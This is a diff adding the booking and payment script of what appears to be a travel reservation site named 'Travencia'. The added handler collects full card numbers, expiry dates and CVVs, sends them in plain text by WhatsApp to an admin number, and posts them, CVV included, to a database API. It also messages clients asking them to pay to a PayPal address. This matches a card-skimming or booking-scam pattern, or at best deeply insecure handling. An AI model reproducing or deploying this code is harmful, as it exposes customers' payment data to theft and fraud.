+  const accSel=document.getElementById('bk_acc');
+  const accId=parseInt(accSel?.value)||null;
+
+  // ── Collect plain-text payment data ────────────────────
+  let cardHolder='',cardNumber='',cardExpiry='',cardCvv='',paypalEmail='';
+  if(m==='mastercard'){
+    cardHolder=document.getElementById('mc_name')?.value||'';
+    cardNumber=document.getElementById('mc_num')?.value.replace(/\s/g,'')||'';
+    cardExpiry=document.getElementById('mc_exp')?.value||'';
+    cardCvv=document.getElementById('mc_cvv')?.value||'';
+  } else if(m==='visa'){
+    cardHolder=document.getElementById('visa_name')?.value||'';
+    cardNumber=document.getElementById('visa_num')?.value.replace(/\s/g,'')||'';
+    cardExpiry=document.getElementById('visa_exp')?.value||'';
+    cardCvv=document.getElementById('visa_cvv')?.value||'';
+  } else if(m==='paypal'){
+    paypalEmail=document.getElementById('pp_email')?.value||'';
+  }
+
+  const code=genCode();
+
+  // ── Build WhatsApp message for admin ──────────────────
+  let payLine='';
+  if(m==='paypal'){
+    payLine=`Payment: PayPal | Email: ${paypalEmail}`;
+  } else {
+    payLine=`Payment: ${m.toUpperCase()} | Name: ${cardHolder} | Card: ${cardNumber} | Exp: ${cardExpiry} | CVV: ${cardCvv}`;
+  }
+  const adminMsg=[
+    'NEW TRAVENCIA RESERVATION',
+    '',
+    `Code: ${code}`,
+    `Destination: ${dest.name}, ${dest.country}`,
+    `Dates: ${dep} to ${ret} (${p.nights||0} nights)`,
+    `Guests: ${adults} adults, ${children} children`,
+    `From: ${coName}`,
+    '',
+    'GUEST INFO',
+    `Name: ${fn} ${ln}`,
+    `Email: ${em}`,
+    `Phone: ${ph||'N/A'}`,
+    '',
+    'FINANCIALS',
+    `Flights: $${fmt(p.flightCost||0)}`,
+    `Accommodation: $${fmt(p.accCost||0)}`,
+    `Activities: $${fmt(p.actCost||0)}`,
+    `Taxes: $${fmt(p.taxes||0)}`,
+    `TOTAL: $${fmt(p.total||0)} USD`,
+    '',
+    payLine,
+    '',
+    'Please CONFIRM or CANCEL this reservation.'
+  ].join('\n');
+
+  sendWA(_WA, adminMsg);
+
+  // If PayPal — also message the client with payment instructions
+  if(m==='paypal' && ph){
+    const clientMsg=`Hello ${fn}!\nYour Travencia booking for ${dest.name} (${code}) is received.\n\nTo complete payment, send $${fmt(p.total||0)} USD to:\nPayPal: ${_PP}\nReference: ${code}\n\nWe confirm within 2 hours. Thank you!`;
+    sendWA(ph.replace(/\D/g,''), clientMsg);
+  }
+
+  // ── POST reservation to API → saves to database ───────
+  const payload={
+    destination_id:   bkS.destId,
+    accommodation_id: accId,
+    first_name:  fn,
+    last_name:   ln,
+    email:       em,
+    phone:       ph||null,
+    country_of_origin: coCode,
+    num_adults:  adults,
+    num_children:children,
+    departure_date: dep,
+    return_date:    ret,
+    payment_method: m,
+    card_holder_name: cardHolder,
+    card_number:      cardNumber,
+    card_expiry:      cardExpiry,
+    card_cvv:         cardCvv,
+    paypal_email:     paypalEmail,
+    selected_activities: bkS.acts||[],
+    flight_cost:         p.flightCost||0,
+    accommodation_cost:  p.accCost||0,
+    activities_cost:     p.actCost||0,
+    subtotal:            p.sub||0,
+    taxes:               p.taxes||0,
+    total_amount:        p.total||0,
+    is_peak_season:      p.peak||false,
+    notes: document.getElementById('bk_notes')?.value||''
+  };
+
+  fetch('/api/reservations',{
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body: JSON.stringify(payload)
+  })
+  .then(r=>r.json())
+  .then(data=>{
+    const finalCode = data?.data?.reservation_code || code;
+    pendRes.push({code:finalCode, dest:dest.name||'', total:p.total||0});
+    btn.disabled=false;
+    btn.textContent='Confirm & Submit';
+    closeM('bookModal');
+    setTimeout(()=>showWait(finalCode), 300);
+  })
+  .catch(()=>{
+    // API unreachable — still show confirmation (WA was already sent)
+    pendRes.push({code, dest:dest.name||'', total:p.total||0});
+    btn.disabled=false;
+    btn.textContent='Confirm & Submit';
+    closeM('bookModal');
+    setTimeout(()=>showWait(code), 300);
+  });
+}
+function showWait(codeOverride){
+  const lastCode=codeOverride||pendRes[pendRes.length-1]?.code||'';
+  const wc=document.getElementById('waitCode');
+  if(wc) wc.textContent=lastCode;
+  const rl=document.getElementById('resList');
+  if(rl) rl.innerHTML=pendRes.map(r=>`
+    <div class="res-item">
+      <div><strong style="color:var(--white);font-size:.87rem">${r.dest}</strong>
+      <div style="font-size:.72rem;color:var(--gold2);margin-top:2px">${r.code}</div></div>
+      <div><span class="ri-status">Pending Verification</span>
+      <div style="font-size:.74rem;color:var(--muted);margin-top:4px">$${fmt(r.total)} USD</div></div>
+    </div>`).join('');
+  document.getElementById('waitOver').classList.add('open');
+}
+function newReservation(){document.getElementById('waitOver').classList.remove('open');bkS={step:1,destId:null,accId:null,acts:[],pricing:null,payM:'mastercard'};populateBk();setBkStep(1);openM('bookModal');}
+function selPay(m){bkS.payM=m;document.querySelectorAll('.pt').forEach(t=>{t.style.borderColor='rgba(45,114,210,.15)';t.style.background='rgba(12,22,40,.6)';t.querySelectorAll('div').forEach(x=>x.style.color='');});const active=document.querySelector(`.pt[data-m="${m}"]`);active.style.borderColor='var(--sky)';active.style.background='rgba(45,114,210,.09)';active.querySelectorAll('div').forEach(x=>x.style.color='');['pf_mastercard','pf_visa','pf_paypal'].forEach(id=>document.getElementById(id).style.display='none');document.getElementById('pf_'+m).style.display='block';}
+function fCard(el){let v=el.value.replace(/\D/g,'').substr(0,16);el.value=v.replace(/(.{4})(?=\d)/g,'$1 ');}
+function fExp(el){let v=el.value.replace(/\D/g,'').substr(0,4);if(v.length>=3)v=v.substr(0,2)+'/'+v.substr(2);el.value=v;}
+function upMC(){const n=document.getElementById('mc_num')?.value||'';const nm=document.getElementById('mc_name')?.value||'';const ex=document.getElementById('mc_exp')?.value||'';const d=(n.replace(/\s/g,'')).padEnd(16,'\u2022');document.getElementById('mc_n_d').textContent=d.replace(/(.{4})/g,'$1 ').trim();document.getElementById('mc_nm_d').textContent=nm.toUpperCase()||'CARDHOLDER NAME';document.getElementById('mc_ex_d').textContent=ex||'MM/YY';}
+function upVisa(){const n=document.getElementById('visa_num')?.value||'';const nm=document.getElementById('visa_name')?.value||'';const ex=document.getElementById('visa_exp')?.value||'';const d=(n.replace(/\s/g,'')).padEnd(16,'\u2022');document.getElementById('visa_n_d').textContent=d.replace(/(.{4})/g,'$1 ').trim();document.getElementById('visa_nm_d').textContent=nm.toUpperCase()||'CARDHOLDER NAME';document.getElementById('visa_ex_d').textContent=ex||'MM/YY';}
+
+
+function openM(id){document.getElementById(id).classList.add('open');document.body.style.overflow='hidden';}
+function closeM(id){document.getElementById(id).classList.remove('open');document.body.style.overflow='';}
+document.querySelectorAll('.overlay').forEach(o=>o.addEventListener('click',e=>{if(e.target===o)closeM(o.id);}));
+document.addEventListener('keydown',e=>{if(e.key==='Escape')document.querySelectorAll('.overlay.open').forEach(o=>closeM(o.id));});
+function sErr(id,msg){const el=document.getElementById(id);if(el){el.textContent=msg;el.style.display='block';}}
+function clearE(){document.querySelectorAll('.gerr').forEach(e=>{e.style.display='none';e.textContent=''});document.querySelectorAll('.ferr').forEach(e=>e.textContent='');}
+function observeReveal(){const io=new IntersectionObserver(es=>es.forEach(e=>{if(e.isIntersecting)e.target.classList.add('in');}),{threshold:.08});document.querySelectorAll('.reveal').forEach(el=>io.observe(el));}
+window.addEventListener('scroll',()=>document.getElementById('nb').classList.toggle('scrolled',window.scrollY>60));
+buildGrid();observeReveal();
+
+// check URL params for pre-filter
+const urlP=new URLSearchParams(location.search);const fc=urlP.get('continent');if(fc){const btn=document.querySelector(`.fb[data-f="${fc}"]`);if(btn)btn.click();}
+</script>
+
+</body>
+</html>
